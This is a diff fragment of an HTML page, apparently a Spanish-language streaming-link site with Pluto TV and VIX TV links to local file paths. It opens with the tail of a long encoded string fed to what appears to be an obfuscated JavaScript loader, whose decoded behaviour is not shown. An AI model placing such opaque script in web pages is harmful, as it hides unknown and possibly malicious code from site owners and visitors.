LvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRqRvRMMvRMCvMLLvMLLvRMMvRqRvRMCvMLLvMLqvMLqvMLqvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLqvRMCvMLqvMLLvRMMvRMCvRqRvRMMvMLLvRMCvRqRvMLLvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvRqRvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLLvRqRvRqRvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRMMvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvMLLvMLqvRMCvMLqvMLLvMLqvRMCvMLqvMLLvRMMvRMCvRqRvRqRvMLqvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLLvRqRvRqRvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRMMvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLqvMLLvMLqvRMCvRqRvRqRvRqRvRMCvMLqvRMMvRMMvMLLvRMCvMLqvRMMvRMMvMLLvRMCvRqRvMLqvRMCvBRRvBLBvMCMvMCLvBLBvBRRvRMMvMLLvMLqvRqRvRMCvRCMvRCRvRLCvqCCvBRRvBLBvMCRvBLBvMCRvBLBvMCCvMBBvBqqvBqqv",13,"CBMRqLvoI",23,6,30))
+</script>
+</div></div>
+<style>
+@media screen and (max-width:480px){.tiktok{font-size:24px;letter-spacing:2px}}
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<nav class="navigation pagination">
+<div class="nav-links">
+<nav class="navigation pagination">
+<div class="nav-links">
+
+ <!-- <a href="" ></a>
+      <a href="" ></a>   -->
+
+<a class="page-link" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\GITHUB PELIS Y SERIES PARA SUBIR A INTERNET\Nueva carpeta (2)\PELIS2022\PLUTO.html"_blank" 
+>PLUTO TV</a>
+<a class="page-link current" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\GITHUB PELIS Y SERIES PARA SUBIR A INTERNET\Nueva carpeta (2)\PELIS2022\VIX.html" >VIX TV</a>
+
+ <!--  <a href="javascript:void(0)" class="extend"></a>
+       <a class="page-link" href="" ></a>  -->
+  
+
+
+
+</div>
+</nav>
+        
+
+
+
+   <!--
+               
+
+
+<nav class="navigation pagination">
+<div class="nav-links">
+<a href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG1.html" >INICIO</a>
+<a href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG2.html" >ANTERIOR</a>
+<a class="page-link current" href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG3.html"_blank" >3</a>
+<a class="page-link" href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG4.html" >4</a>
+<a class="page-link" href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG5.html" >5</a>
+<a href="javascript:void(0)" class="extend">...</a>
+<a class="page-link" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\JDM\pagina38.html" >?</a>
+
+<a href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG4.html" >SIGUIENTE</a>
+</div>
+</nav>
+
+
+        
+  -->
+
+		</section>
+<BR> <BR> 
+
+</body>
+</html>
+
